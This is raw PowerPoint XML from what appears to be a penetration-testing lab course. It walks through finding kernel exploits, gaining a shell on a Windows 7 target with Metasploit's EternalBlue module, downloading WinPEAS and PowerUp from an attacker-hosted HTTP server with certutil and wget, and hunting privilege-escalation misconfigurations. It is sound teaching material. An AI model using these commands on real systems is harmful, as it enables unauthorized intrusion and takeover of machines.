              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 2.6.24</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 2 — Search for Exploits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Done on: Kali Linux (Attacker Machine)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Research vulnerabilities for that kernel.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Example tools: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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>searchsploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> kernel 2.6</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>What to Look For</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Exploits matching the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>exact kernel version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Local Privilege Escalation (LPE) exploits </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Public exploits (Exploit-DB / CVEs)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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712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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  TASK 02 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1844920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12001501" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Task 02: Windows Privilege Escalation (The Path to SYSTEM) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:latin typeface="+mj-lt"/>
            </a:endParaRP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○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Elevate privileges on a Windows environment from a standard user to NT AUTHORITY\SYSTEM. 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○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>  Enumeration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Use WinPEAS.exe and PowerUp.ps1 to find unquoted service paths, weak service permissions,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 and stored credentials in  the registry. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Token Impersonation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Learn how to use tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>PrintSpoofer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> or the "Potato" family (Juicy/God/Rotten Potato)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 if the user has </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>SeImpersonatePrivilege</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>. 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○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Mastering Windows-specific misconfigurations like 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"Unquoted Service Paths." </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030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05181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+mj-lt"/>
              </a:rPr>
              <a:t>Initial Access (Precondition):-Before privilege escalation, we need a foothold (shell access)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 on the target system Win 7. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>msfconsole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use exploit/windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>smb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/ms17_010_eternalblue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set RHOST &lt;target-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt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set LHOST &lt;your-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt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exploit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This gives us a shell (often low privilege). Now we proceed to privilege escalation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔹 Step 1 — Transfer Tools to Target (win 7)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We have a low-privilege user on Windows. Our goal is to escalate privileges to NT AUTHORITY\SYSTEM, which has full control over the system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Done on: Kali Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>→ Windows 7 Target Machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>shell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61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cd /opt/PEASS-ng/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>winPEAS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B61264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👉 Start HTTP server on Kali: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61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 8000</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr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45374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+mj-lt"/>
              </a:rPr>
              <a:t>👉 On Windows target Transfer from Kali → execute on Windows target shell (inside the shell we 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obtained):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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -split -f http://&lt;KALI_IP&gt;:8000/winPEAS.exe winPEAS.exe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err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://YOUR_IP:8000/winPEASx64.exe -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>OutFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t> winpeas.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B61264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</a:rPr>
              <a:t>(If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> not available, use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 👇)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solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -f http://YOUR_IP:8000/winPEASx64.exe winpeas.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B61264"/>
              </a:solidFill>
              <a:latin typeface="+mj-lt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err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -split -f http://&lt;KALI_IP&gt;:8000/PowerUp.ps1 PowerUp.ps1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solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -split -f http://YOUR_IP:8000/winPEASx64.exe winpeas.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" alt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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔹 Step 2 — Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>WinPEAS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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Done on: Windows Target Machine You don’t have to have the physical access of the target machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> You will get the Target’s shell </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="+mj-lt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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cd C:\Users\Public   or    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> C:\Users\Public</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B61264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Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Winpeas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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>winPEAS.exe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61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>winpeas.exe &gt; output.txt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</a:rPr>
              <a:t>or in PowerShell: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rgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>.\winPEAS.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr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21688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567886" cy="68580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First we enumerate the system to find misconfigurations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0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔍 What </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>WinPEAS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Does (Simple)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Automatically scans for:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Unquoted service paths </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Weak service permissions </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Registry credentials </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Scheduled tasks </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Always Install Elevated </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Token privileges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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🎯 What to Look For</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Unquoted Service Paths (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ServiceName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>VulnService</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Path: C:\Program Files\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Vuln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> App\service.exe)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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Writable Service Binaries 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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Registry-stored Credentials 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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Weak Permissions </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1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02079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+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>🔴 PART 2 — USING PowerUp.ps1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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 1: Transfer PowerUp.ps1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On Kali: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cd /opt/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>PowerSploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Privesc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python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 8000</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cd C:\Users\Public</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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US" sz="1800" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://YOUR_IP:8000/PowerUp.ps1 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" u="sng" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>OutFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t> PowerUp.ps1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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1800" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Or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B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="B61264"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>urlcache</a:t>
